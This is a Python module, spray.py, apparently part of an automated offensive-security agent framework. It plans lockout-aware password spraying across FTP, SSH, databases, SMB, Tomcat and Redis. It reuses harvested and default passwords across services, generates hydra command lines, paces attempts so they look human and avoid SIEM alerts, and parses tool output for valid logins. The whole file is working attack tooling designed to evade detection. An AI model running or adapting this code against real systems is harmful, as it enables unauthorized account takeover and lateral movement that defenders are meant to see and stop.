"""spray.py — lockout-aware credential spray + cross-service reuse.

A senior operator does NOT run `hydra -L big_users -P big_pass`. The
discipline is:

  * FEW passwords, MANY accounts, paced — one password per round across
    every account, never N passwords against one account (that is a
    brute force that trips lockout policies).
  * LOCKOUT AWARENESS — stop at MAX_ATTEMPTS_PER_USER attempts per
    account per service; once tripped the account is backed off for the
    rest of the engagement (further hits only push the counter toward
    a lockout an admin WILL see in their SIEM).
  * CROSS-SERVICE REUSE — a password harvested anywhere is tried
    everywhere it can authenticate (SSH 22/2222, SMB 445, MySQL,
    PostgreSQL, FTP, Tomcat manager...), because credential reuse is
    the single most productive lateral move in real engagements.
  * PACING — attempts are issued with a per-service delay so the
    authentication stream looks like humans, not a spray tool.

The ledger is in-memory per agent run (the auto-mode's WorldModel is the
source of truth; this ledger tracks what we have already TRIED).
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, Iterable, List, Optional, Set, Tuple

# Lockout discipline constants (aligned with typical enterprise policies:
# Windows default 5 badPwdCount, common Linux rate limits ~3-5).
MAX_ATTEMPTS_PER_USER = 3          # hard cap per (host, service, user)
DEFAULT_ROUND_PACING_S = 8.0       # seconds between rounds per service

# Services that accept (username, password) auth and are worth spraying,
# with their well-known ports. Order = noise preference (SSH brute is
# louder than FTP; keep the quiet ones first).
_SPRAYABLE_SERVICES: Tuple[Tuple[str, str], ...] = (
    ("ftp", "21"),
    ("ssh", "22"),
    ("mysql", "3306"),
    ("postgresql", "5432"),
    ("microsoft-ds", "445"),   # SMB
    ("smb", "445"),
    ("tomcat", "8080"),        # manager GUI
    ("redis", "6379"),         # ACL auth (password-only, user ignored)
)

# hydra module per service (the toolbelt picks hydra > medusa; the plan
# emits hydra syntax — medusa equivalence is handled by the adapter).
_HYDRA_MODULE = {
    "ftp": "ftp",
    "ssh": "ssh",
    "mysql": "mysql",
    "postgresql": "postgres",
    "microsoft-ds": "smb",
    "smb": "smb",
    "tomcat": "http-get",      # /manager/html basic auth
    "redis": "redis",
}


@dataclass
class SprayLedger:
    """Tracks every credential attempt so the same user is never pushed
    past the lockout threshold, and locked accounts are excluded."""
    max_attempts: int = MAX_ATTEMPTS_PER_USER
    attempts: Dict[Tuple[str, str, str], int] = field(default_factory=dict)
    locked: Set[Tuple[str, str, str]] = field(default_factory=set)
    successes: Dict[Tuple[str, str, str], str] = field(default_factory=dict)

    def can_attempt(self, host: str, service: str, user: str) -> bool:
        key = (host, service, user)
        if key in self.locked:
            return False
        return self.attempts.get(key, 0) < self.max_attempts

    def record_attempt(self, host: str, service: str, user: str) -> None:
        key = (host, service, user)
        self.attempts[key] = self.attempts.get(key, 0) + 1
        if self.attempts[key] >= self.max_attempts:
            # budget exhausted: back the account off for the engagement
            self.locked.add(key)

    def record_success(self, host: str, service: str, user: str,
                       password: str) -> None:
        self.successes[(host, service, user)] = password

    def spent(self, host: str, service: str) -> int:
        return sum(v for (h, s, _), v in self.attempts.items()
                   if h == host and s == service)

    def summary(self) -> Dict[str, int]:
        return {
            "attempts": sum(self.attempts.values()),
            "accounts_backed_off": len(self.locked),
            "successes": len(self.successes),
        }


@dataclass
class SprayRound:
    """One round of the spray: ONE password tried against MANY accounts
    on ONE service. This shape is the lockout-safe core of the ledger."""
    service: str
    host: str
    port: str
    password: str
    users: List[str]
    pacing_s: float = DEFAULT_ROUND_PACING_S

    def hydra_command(self) -> str:
        """hydras -L userlist -p <single-pass> form: one password, many
        users — the definition of a spray (never -P with many passwords)."""
        mod = _HYDRA_MODULE.get(self.service, self.service)
        return (f"hydra -L users.txt -p {self.password} -t 2 -W 4 -f "
                f"-s {self.port} {mod}://{self.host}:{self.port}")

    def to_dict(self) -> dict:
        return {"service": self.service, "host": self.host,
                "port": self.port, "users": len(self.users),
                "password_sha_prefix": self.password[:4] + "…",
                "pacing_s": self.pacing_s}


def sprayable_services(wm) -> List[Tuple[str, str]]:
    """(service, port) pairs the WorldModel proves are open AND sprayable."""
    out: List[Tuple[str, str]] = []
    for f in wm.find("service"):
        v = f.value if isinstance(f.value, dict) else {}
        name = str(v.get("service", "")).lower()
        port = str(v.get("port", "")).split("/")[0]
        for svc, well_known in _SPRAYABLE_SERVICES:
            if svc in name or name in svc or port == well_known:
                entry = (svc, port or well_known)
                if entry not in out:
                    out.append(entry)
    return out


def harvested_creds(wm) -> List[Tuple[str, str]]:
    """Valid (user, password) pairs from any source (brute, web dump,
    loot, cloud), deduped."""
    out: List[Tuple[str, str]] = []
    for f in wm.find("creds"):
        v = f.value if isinstance(f.value, dict) else {}
        u, p = str(v.get("username", "")), str(v.get("password", ""))
        if u and p and (u, p) not in out:
            out.append((u, p))
    return out


def plan_spray(wm, ledger: Optional[SprayLedger] = None,
               max_rounds_per_service: int = 2,
               extra_users: Optional[Iterable[str]] = None,
               host: Optional[str] = None,
               pacing_s: float = DEFAULT_ROUND_PACING_S,
               ) -> List[SprayRound]:
    """Build the lockout-safe spray plan from the WorldModel.

    Rounds: ONE password per round against the user list — never the
    reverse. Users = harvested usernames + discovered/known account
    names. Accounts already at the attempt cap (from a previous round in
    this engagement) are excluded; services with no accounts left are
    skipped entirely.
    """
    ledger = ledger or SprayLedger()
    target = host or getattr(wm, "target", "") or ""
    users: List[str] = [u for u, _ in harvested_creds(wm)]
    for u in (extra_users or []):
        u = str(u).strip()
        if u and u not in users:
            users.append(u)
    if not users:
        return []
    passwords: List[str] = []
    for _, p in harvested_creds(wm):
        if p not in passwords:
            passwords.append(p)
    # reuse known default passwords too — but at the END (reuse first)
    from phantom.utils.rce_deployer import DEFAULT_CREDENTIALS
    for _, p in DEFAULT_CREDENTIALS.get("ssh", []):
        if p and p not in passwords:
            passwords.append(p)

    rounds: List[SprayRound] = []
    for svc, port in sprayable_services(wm):
        allowed = [u for u in users
                   if ledger.can_attempt(target, svc, u)]
        if not allowed:
            continue
        for password in passwords[:max_rounds_per_service]:
            if not allowed:
                break
            rounds.append(SprayRound(
                service=svc, host=target, port=port, password=password,
                users=list(allowed), pacing_s=pacing_s))
            # the plan itself consumes the attempt budget (the interpreter
            # records successes separately) — model one attempt per user
            for u in allowed:
                ledger.record_attempt(target, svc, u)
            allowed = [u for u in users
                       if ledger.can_attempt(target, svc, u)]
    return rounds


def parse_spray_output(output: str) -> List[Tuple[str, str, str, str]]:
    """hydra/medusa success lines -> (service, host, user, password)."""
    out: List[Tuple[str, str, str, str]] = []
    import re
    for line in output.splitlines():
        low = line.lower()
        if "login:" in low and "password:" in low:
            try:
                user = line.split("login:")[1].split()[0].strip()
                pw = line.split("password:")[1].split()[0].strip()
                host_m = re.search(r"host:\s*([^\s,()]+)", low)
                svc_m = re.search(r"^\[[^\]]*\]\[[^\]]*\]\s*\[([^\]]+)\]",
                                  line.strip())
                service = svc_m.group(1) if svc_m else ""
                host = host_m.group(1) if host_m else ""
                if user and pw:
                    out.append((service, host, user, pw))
            except (IndexError, ValueError):
                continue
        elif "[success]" in low and "user:" in low:
            mu = re.search(r"User:\s*([^\s,()]+)", line)
            mp = re.search(r"Password:\s*([^\s,()\[\]]+)", line)
            mh = re.search(r"Host:\s*([^\s,()]+)", line)
            if mu and mp:
                out.append(("", mh.group(1) if mh else "",
                            mu.group(1).strip(), mp.group(1).strip()))
    return out


__all__ = ["SprayLedger", "SprayRound", "plan_spray", "parse_spray_output",
           "sprayable_services", "harvested_creds",
           "MAX_ATTEMPTS_PER_USER", "DEFAULT_ROUND_PACING_S"]
